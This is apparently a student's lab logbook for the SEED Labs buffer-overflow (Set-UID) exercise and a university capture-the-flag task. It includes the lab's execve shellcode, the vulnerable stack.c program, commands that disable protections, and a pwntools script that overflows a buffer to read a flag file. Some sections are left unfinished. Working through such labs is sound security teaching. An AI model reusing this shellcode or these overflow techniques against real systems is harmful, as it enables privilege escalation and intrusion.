# Trabalho realizado na Semana #5 - SEED Labs - Buffer-Overflow Attack Lab (Set-UID Version)

To complete these tasks, we needed to disable the adress space randomization security mechanism, to make it easier to identify the adresses of the components and so that the address of the variables stay the same in each execution of a program

```
$ sudo sysctl -w kernel.randomize_va_space=0
```

Furthermore, since `/bin/dash` has an implemented security countermeasure that makes our attacks more difficult, we link `/bin/sh` to `/bin/zsh`, a shell that doesn't have such countermeasure and will let us create SET-UID attack programs

```
$ sudo ln -sf /bin/zsh /bin/sh
```

## Task 1: Getting Familiar with Shellcode
- We cannot just compile this code and use the binary code as our shellcode 

1. Write a shellcode is to use assembly code. Given two versions, 32-bit and 64-bit

2. Explaining how the 32.bit version works
    - The third instruction pushes "//sh", rather than "/sh" into the stack. This is because we need a
32-bit number here, and "/sh" has only 24 bits. Fortunately, "//" is equivalent to "/", so we can
get away with a double slash symbol.
    - We need to pass three arguments to execve() via the ebx, ecx and edx registers, respectively.
The majority of the shellcode basically constructs the content for these three arguments.
    - The system call execve() is called when we set al to 0x0b, and execute "int 0x80".

**shellcode32:**
```c
; Store the command on stack
xor eax, eax
push eax
push "//sh"
push "/bin"
mov ebx, esp ; ebx --> "/bin//sh": execve()’s 1st argument

; Construct the argument array argv[]
push eax ; argv[1] = 0
push ebx ; argv[0] --> "/bin//sh"
mov ecx, esp ; ecx --> argv[]: execve()’s 2nd argument

; For environment variable
xor edx, edx ; edx = 0: execve()’s 3rd argument

; Invoke execve()
xor eax, eax ;
mov al, 0x0b ; execve()’s system call number
int 0x80
```

3. The function to run the code assembly mencioned above was given to us:

**call_shellcode.c**
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char shellcode[] = 
#if __x86_64__
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;

int main(int argc, char **argv)
{
    char code[500];
    strcpy(code, shellcode); // Copy the shellcode to the stack
    int (*func)() = (int(*)())code;
    func(); // Invoke the shellcode from the stack
    return 1;
}
```

4. We now compile it. If we add the -m32 flag, the 32 bit version will run, if we don't the 64-bit version will run.

![Task1Make](/Logbooks/img/Week5/Task1Make.png)

## Task 2: Understanding the Vulnerable Program

1. They gave us the stack.c program:

**stack.c:**
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Changing this size will change the layout of the stack.
* Instructors can change this value each year, so students
* won’t be able to use the solutions from the past. */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

int bof(char *str)
{
    char buffer[BUF_SIZE];

    /* The following statement has a buffer overflow problem */
    strcpy(buffer, str);
    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;
    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
```

2. This program has a buffer overflow vulnerability. It reads an input with a max of 517 bytes, passes it to another buffer in the bof() function. But since the buffer in bof() can only retain less than 517 bytes, a buffer overflow will occur. Since the file that we are reading from has user access, we can alter it to achieve a root shell.

3. Turn off the StackGuard and the non-executable stack protections using the -fno-stack-protector and "-z execstack"

```
$ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
```

4. We need to make the program a root-owned Set-UID program so whe change the ownership of the program to root and then change the permission to 4777 to enable the SET-UID bit.

```
$ sudo chown root stack 
$ sudo chmod 4755 stack 
```

5. A Makefile is already given, but we change the values of L1, L2 and L3, being L4 a fixed number. We opted for L1=100, L2=160 and L3=200

6. We compiled it and checked the permissions, confirming the SET-UID bit

![Task2Make](/Logbooks/img/Week5/Task2Make.png)
![permissions](/Logbooks/img/Week5/permissions.png)


## Task 3: Launching Attack on 32-bit Program (Level 1)

1. We compiled and run the given program to see the adresses of the variables in the stack

**gbd stack-L1-dbg:**
![gbdStack](/Logbooks/img/Week5/gbdStack.png)

**b bof and run:**
![bBofAndRun](/Logbooks/img/Week5/bBofAndRun.png)

**next:**
![next](/Logbooks/img/Week5/next.png)

**p $ebd and p &buffer:**
![pEbdAndBuffer](/Logbooks/img/Week5/pEBDAndBuffer.png)


2.

## Task 4: Launching Attack without Knowing Buffer Size (Level 2)



# CTF - Control The Flag

## Desafio 1:
1. Initially we started by installing the pwntools and the packet checksec, and the zip files containing an executable called program, a main.c file and a python script called exploit-example.py

2. Right after, we executed the checksec command on the terminal and we got the following results:

![checksec](/Logbooks/img/Week5/checksekProgram.png)

**Observations:**
- x86 Architecture
- No cannary to protect return adress
- Stack has execute permissions - NX
- The binary positions aren't randomized
- There are memory regions with RMX permissions (Read, Write and Execute)

3. We check the given program and python script, namely main.c and exploit-example.py:

**main.c:**
```c++
#include <stdio.h>
#include <stdlib.h>

int main() {
    char meme_file[8] = "mem.txt\0";
    char buffer[32];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%40s", &buffer);

    printf("Echo %s\n", buffer);

    printf("I like what you got!\n");
    
    FILE *fd = fopen(meme_file,"r");
    
    while(1){
        if(fd != NULL && fgets(buffer, 32, fd) != NULL) {
            printf("%s", buffer);
        } else {
            break;
        }
    }


    fflush(stdout);
    
    return 0;
}
```

**exploit-example.py:**
```python
#!/usr/bin/python3
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4003)

r.recvuntil(b":")
r.sendline(b"Tentar nao custa")
r.interactive()
```

**Observations:**
- There isn't a function that checks for overflows
- The buffer value is read through scanf(), an input function
- The file is saved in an array that is located right above the variable buffer
- Flag is saved in a text file called flag.txt


4. To cause an overflow, we should fill the buffer with an input of 32 characters and at the end, to open the file that contains the flag (flag.txt), we insert the name of that file.

5. This way, the flag.txt is going to be opened and the flag that it contains is going to be printed in the terminal:

![flag1](/Logbooks/img/Week5/flag.png)


## Desafio 2:

1. On this challenge, we now contain a different main.c file:

**main.c**
```c++
#include <stdio.h>
#include <stdlib.h>

int main() {
    char val[4] = "\xef\xbe\xad\xde";
    char meme_file[9] = "mem.txt\0\0";
    char buffer[32];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%45s", &buffer);
    if(*(int*)val == 0xfefc2324) {
        printf("I like what you got!\n");
        
        FILE *fd = fopen(meme_file,"r");
        
        while(1){
            if(fd != NULL && fgets(buffer, 32, fd) != NULL) {
                printf("%s", buffer);
            } else {
                break;
            }
        }
    } else {
        printf("You gave me this %s and the value was %p. Disqualified!\n", meme_file, *(long*)val);
    }

    fflush(stdout);
    
    return 0;
}
```

**Observations:**
In comparison with the previous main file:
- This one checks if a value as been altered without knowing `if(*(long*)val == 0xfefc2122)`
- There is another buffer called val that is situated between buffer and meme_file. This provides a little more protection.
- In case the value of val is not valid, an error message is printed

2. Initially, we started by executing again the checksec command, that gave us the same information

![checksec2](/Logbooks/img/Week5/checksekProgram2.png)

3. To overflow this system we follow the same strategy from the previous *Desafio* but now we should also add to the input the address that is beeing compared to the val buffer (0xfefc2122), used to check if something was adulterated

4. To do such thing, we changed the given exploit-example.py so that the main.c function receives the exact input to unlock the flag contained in the flag.txt file. We named that script exploit.py

**exploit.py:**
```python
#!/usr/bin/python3
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4000)

r.recvuntil(b":")
r.sendline(b"qwertyuiopasdfghjklzxcvbnmqwerty\x24\x23\xfc\xfeflag.txt")
r.interactive()
```

4. Finally, we obtained the following results:

![flag2](/Logbooks/img/Week5/flag2.png)
